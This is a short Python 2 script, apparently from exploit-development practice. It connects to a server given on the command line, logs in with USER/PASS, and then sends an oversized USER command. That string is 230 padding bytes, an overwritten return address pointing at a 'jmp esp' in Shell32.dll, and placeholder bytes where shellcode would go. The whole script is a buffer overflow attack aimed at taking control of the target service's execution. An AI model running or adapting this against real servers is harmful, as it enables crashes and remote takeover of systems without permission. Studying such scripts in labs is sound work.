#!/usr/bin/python

import socket
import sys

junk = 'A' * 230
eip_override = '\xD7\x30\x9D\x7C' #7C9D30D7 -- Shell32.dll
dummy_shell_code = 'B' * 100

check_jmp_esp_cmd_string = junk + eip_override + dummy_shell_code

server_ip = str(sys.argv[1])
server_port = int(sys.argv[2])

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "\nNow sending the string with shell module jmp esp location just to investigate what happens.\n"
soc.connect((server_ip, server_port))
d = soc.recv(1024)

soc.send('USER someone' + '\r\n')
d = soc.recv(1024)

soc.send('PASS someone' + '\r\n')
d = soc.recv(1024)

soc.send('USER ' + check_jmp_esp_cmd_string + '\r\n')
d = soc.recv(1024)

soc.close()

print "\nDone sending the string."
